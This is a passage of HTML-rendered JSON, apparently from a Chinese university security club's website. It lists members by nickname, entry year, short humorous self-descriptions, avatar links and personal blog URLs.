class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://wzyxv1n.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cosmos&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 莫得灵魂的开发 / 茄粉 / 作豚 /  米厨&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/cosmos.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cosmos.red&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Y&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / Bin / Win / 电竞缺乏视力 / 开发太菜 / 只会 C / CSGO 白给选手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Y.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.xyzz.ml:444/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Annevi&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 会点开发的退休web手 / 想学挖洞 / 混吃等死&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=WN9x96MpjSJ3Gc7a3SHtDw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://annevi.cn&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;logong&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / 求大佬带我IoT入门 / web太难了只能做做misc维持生计 / 摸🐟&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/logong.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://logong.vip&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Kevin&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / Web / 车万&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=jaXAqywDMbia39e4OfGXicPQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://harmless.blue/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LurkNoi&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 会一丢丢crypto / 摸鱼&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=CLTlN5QPS3aI60icIoxGmdQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;幼稚园&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级会长 / 二进制安全 /  干拉&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=G2o7mX9RCTkiaCHeEiaJLBwA&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://danisjiang.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;lostflower&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 游戏引擎开发 / 尚有梦想的game maker&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=eQHtN69C2tgM8Ul8PmtTKw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://r000setta.github.io&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Roc826&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / Web 底层选手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Roc826.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://www.roc826.cn/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Seadom&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / Web / 真·菜到超乎想象 / 拼死学（mo）习（yu）中&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/seadom.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ObjectNotFound&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 懂点Web &amp; Misc / 懂点运维 / 正在懂游戏引擎 / 我们联合！&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=yQnkF86Uy6UkZrZmFYLL4g&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.zhouweitong.site&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Moesang&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / 不擅长 Web / 擅长摸鱼 / 摸鱼！&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Moesang.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.wz22.cc&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;E99p1ant&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 囊地鼠饲养员 / 写了一个叫 Cardinal 的平台&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=AJQ9RJRCavhSibMZtRq2JOQ&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.red/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Michael&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18 级 / Java / 会除我佬&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Michael.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://michaelsblog.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;matrixtang&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 编译器工程师( 伪 / 半吊子PL- 静态分析方向&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/MATRIX.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;r4u&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 不可以摸🐠哦&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=rJCqQv1EzicpDW77nMa5bYw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://r4u.top/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;357&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;18级 / 并不会web / 端茶送水选手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=POaV9Y85NiaUcibaETEKTpfw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Li4n0&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17 级 / Web 安全爱好者 / 半个程序员 / 没有女朋友&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/li4no.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.0e1.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;迟原静&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17级 / Focus on Java Security&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=xyVPFvQ2dWReoBiahd7naSw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ch1p&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17 级 / 自称 Bin 手实际啥都不会 / 二次元安全&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Chip.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://ch1p.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;f1rry&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17 级 / Web&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/f1rry.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;mian&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17 级 / 业余开发 / 专业摸鱼&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/mian.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://www.intmian.com&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;ACce1er4t0r&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17级 / 摸鱼ctfer / 依旧在尝试入门bin / 菜鸡研究生+1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=gRBlwiawx1lF4UkPKh4Liczg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;MiGo&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17级 / 二战人 / 老二次元 / 兴趣驱动生活&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=XzZggL7hDeicLXb2FSic6sfg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://migoooo.github.io/&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;BrownFly&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17级 / RedTeamer / 字节跳动安全工程师&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=EnNslsFelj9HibuKoNHwmyg&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://brownfly.github.io&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Aris&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17级/ Key厨 / 腾讯玄武倒水的&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=anjeaJmx1X79Yp1DNxWrRA&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.ar1s.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;hsiaoxychen&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17级 / 游戏厂打工仔 / 来深圳找我快活&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=YGiaicyZ3NkWfOoGOlLPWvAw&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://chenxy.me&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Lou00&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;17级 / web / 东南读研&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://thirdqq.qlogo.cn/g?b=sdk&amp;k=fdAMuUicvOObMv3eZC8y0Ew&amp;s=640&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://blog.lou00.top&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Junier&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / 立志学术的统计er / R / 为楼上的脱单事业做出了贡献&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Junier.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;bigmud&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级会长 / Web 后端 / 会一点点 Web 安全 / 会一丢丢二进制&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/bigmud.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;NeverMoes&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Java 福娃 / 上班 996 / 下班 669&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/nervermoes.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Sora&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Web Developer&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/Sora.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://github.com/Last-Order&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;fantasyqt&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / 可能会运维 / 摸鱼选手&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/fantasyqt.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;http://0x2f.xyz&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;vvv_347&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Rev / Windows / Freelancer&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/vvv_347.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://vvv-347.space&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;veritas501&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Bin / 被迫研狗&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/veritas501.jpeg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://veritas501.space&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;LuckyCat&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Web 🐱 / 现于长亭科技实习&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/princessprincepal.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://jianshu.com/u/ad5c1e097b84&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Ash&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Java 开发攻城狮 / 996 选手 / 濒临猝死&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;../../images/avatar/ash.jpg&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;url&quot;</span><span class="punctuation">:</span> <span class="string">&quot;#&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span><span class="punctuation">,</span> <span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Cyris&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;intro&quot;</span><span class="punctuation">:</span> <span class="string">&quot;16 级 / Web 前端 / 美工 / 阿里云搬砖&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;avatar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;https://cdn.jsdelivr.net/npm/cyris/images/avatar.png&quot;</span><span 